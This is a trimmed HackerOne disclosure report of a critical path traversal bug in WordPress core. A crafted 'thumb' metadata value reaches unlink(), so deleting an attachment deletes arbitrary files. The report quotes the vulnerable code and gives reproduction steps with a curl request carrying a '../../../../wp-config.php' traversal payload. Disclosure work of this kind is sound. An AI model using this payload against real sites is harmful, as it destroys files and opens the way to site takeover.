# [C] Arbitrary file deletion in wp-core - guides towards RCE and information disclosure

## Summary
Severity: Critical (CVSS 9.9)
Program: WordPress
Weakness: Path Traversal
Reporter: b258ea62bf297b02afa9854
State: resolved
Disclosed: 2018-08-29T13:47:04.950Z
Source: https://hackerone.com/reports/291878

## Details
Vulnerable place 1: `wp-admin/post.php`
`$newmeta['thumb']` is placed into DB not sanitized directly from user input.
```
case 'editattachment':
    check_admin_referer('update-post_' . $post_id);
    // Don't let these be changed
    unset($_POST['guid']);
    $_POST['post_type'] = 'attachment';
    // Update the thumbnail filename
    $newmeta = wp_get_attachment_metadata( $post_id, true );
    $newmeta['thumb'] = $_POST['thumb'];
    wp_update_attachment_metadata( $post_id, $newmeta );
``` 
Vulnerable place 2: `wp_delete_attachment` 
There we have `$meta = wp_get_attachment_metadata( $post_id );` and below in the code:
```
if ( ! empty($meta['thumb']) ) {
        // Don't delete the thumb if another attachment uses it.
        if (! $wpdb->get_row( $wpdb->prepare( "SELECT meta_id FROM $wpdb->postmeta WHERE meta_key = '_wp_attachment_metadata' AND meta_value LIKE %s AND post_id <> %d", '%' . $wpdb->esc_like( $meta['thumb'] ) . '%', $post_id)) ) {
            $thumbfile = str_replace(basename($file), $meta['thumb'], $file);
            /** This filter is documented in wp-includes/functions.php */
            $thumbfile = apply_filters( 'wp_delete_file', $thumbfile );
            @ unlink( path_join($uploadpath['basedir'], $thumbfile) );
        }
    }
```
This means we can craft any value from the `wp-admin` for `thumb` property and that value to be sent towards `@unlink`

How to reproduce:

1. Upload image via media menu e.g. new
2. Go to edit post (old fashioned way)
3. Grad the `id`, `_wpnonce` and choose your payload `../../../../wp-config.php`
4. Craft your payload(set auth cookies, ua, referrers, ...): 
```
curl 'http://localhost/ripsa/wpvuln/wp-admin/post.php?post=[your_postid]&action=editattachment&_wpnonce=[yournonce]' -H 'place your client headers: ua, cookies in order to mimic the authenticated user ' -d 'thumb=../../../../wp-config-slavco.php' --compressed 
```
5. Delete the file from the admin

_Trimmed to 38 lines — full report: https://hackerone.com/reports/291878_
